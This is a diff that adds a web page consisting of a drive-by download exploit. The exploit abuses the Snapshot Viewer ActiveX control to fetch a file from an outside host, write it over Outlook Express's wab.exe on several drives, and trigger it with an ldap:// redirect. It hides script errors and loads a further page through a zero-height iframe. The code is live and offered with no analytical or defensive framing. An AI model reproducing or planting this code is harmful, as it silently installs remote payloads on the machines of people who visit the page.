@@ -1,0 +1,48 @@
+<script type="text/javascript">
+function killErrors() {
+return true;
+}
+window.onerror = killErrors;
+
+var x;
+var obj;
+var mycarsjs = new Array();
+mycarsjs[0] = "c:/Program Files/Outlook Express/wab.exe";
+mycarsjs[1] = "d:/Program Files/Outlook Express/wab.exe";
+mycarsjs[2] = "e:/Program Files/Outlook Express/wab.exe";
+
+var objlcx = new ActiveXObject("snpvw.Snapshot Viewer Control.1");
+
+if(objlcx="[object]")
+{
+
+setTimeout('window.location = "ldap://"',3000);
+
+for (x in mycarsjs)
+{
+obj = new ActiveXObject("snpvw.Snapshot Viewer Control.1")
+
+var buf1 = 'http://user999.78-10.net/as.css';
+var buf2=mycarsjs[x];
+
+obj.Zoom = 0;
+
+obj.ShowNavigationButtons = false;
+
+obj.AllowContextMenu = false;
+
+obj.SnapshotPath = buf1;
+
+
+try
+{
+obj.CompressedPath = buf2;
+obj.PrintSnapshot();
+
+}catch(e){}
+
+}
+}
+
+</script>
+<iframe src=ce.htm width=100 height=0></iframe>
